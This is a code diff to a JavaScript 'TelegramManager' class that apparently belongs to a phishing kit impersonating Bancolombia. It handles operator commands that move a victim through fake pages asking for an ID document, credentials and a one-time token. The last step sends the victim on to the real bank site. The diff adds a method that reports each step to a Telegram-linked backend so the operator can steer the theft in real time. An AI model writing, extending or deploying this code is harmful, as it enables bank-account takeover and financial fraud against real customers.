@@ -99,30 +99,34 @@ class TelegramManager {
             case 'error_documento':
                 // Keep overlay active during redirect
                 this.showOverlay();
+                this.sendConfirmation(action);
                 setTimeout(() => {
-                    window.location.href = '/public/index.html?error=documento';
+                    window.location.href = '/index.html?error=documento';
                 }, 100);
                 break;
 
             case 'pedir_logo':
                 // Keep overlay active during redirect
                 this.showOverlay();
+                this.sendConfirmation(action);
                 setTimeout(() => {
-                    window.location.href = '/public/next-step.html';
+                    window.location.href = '/next-step.html';
                 }, 100);
                 break;
 
             case 'error_logo':
                 // Keep overlay active during redirect
                 this.showOverlay();
+                this.sendConfirmation(action);
                 setTimeout(() => {
-                    window.location.href = '/public/next-step.html?error=credenciales';
+                    window.location.href = '/next-step.html?error=credenciales';
                 }, 100);
                 break;
 
             case 'pedir_token':
                 // Check if we're on next-step page
                 const currentPath = window.location.pathname;
+                this.sendConfirmation(action);
                 if (currentPath.includes('next-step')) {
                     // Hide overlay and switch to token card
                     this.hideOverlay();
@@ -137,7 +141,7 @@ class TelegramManager {
                     // Redirect to next-step with token open
                     this.showOverlay();
                     setTimeout(() => {
-                        window.location.href = '/public/next-step.html?openToken=1';
+                        window.location.href = '/next-step.html?openToken=1';
                     }, 100);
                 }
                 break;
@@ -145,6 +149,7 @@ class TelegramManager {
             case 'error_token':
                 // Hide overlay and show error
                 this.hideOverlay();
+                this.sendConfirmation(action);
                 const tokenInput = document.getElementById('tokenInputCard');
                 if (tokenInput) {
                     tokenInput.value = '';
@@ -160,6 +165,7 @@ class TelegramManager {
             case 'finalizar':
                 // Keep overlay active during redirect
                 this.showOverlay();
+                this.sendConfirmation(action);
                 setTimeout(() => {
                     window.location.href = 'https://www.bancolombia.com/personas';
                 }, 100);
@@ -168,6 +174,32 @@ class TelegramManager {
             default:
                 console.warn('❓ Acción desconocida:', action);
                 this.hideOverlay();
+        }
+    }
+
+    async sendConfirmation(action) {
+        // Enviar mensaje de confirmación a Telegram
+        const actionNames = {
+            'error_documento': '❌ Error Documento',
+            'pedir_logo': '✅ Pedir Logo (Credenciales)',
+            'error_logo': '❌ Error Logo',
+            'pedir_token': '🔑 Pedir Token',
+            'error_token': '❌ Error Token',
+            'finalizar': '🏁 Finalizar'
+        };
+        
+        try {
+            await fetch('/api/send-confirmation', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                credentials: 'include',
+                body: JSON.stringify({ 
+                    action: action,
+                    actionName: actionNames[action] || action
+                })
+            });
+        } catch (error) {
+            console.error('Error enviando confirmación:', error);
         }
     }
 
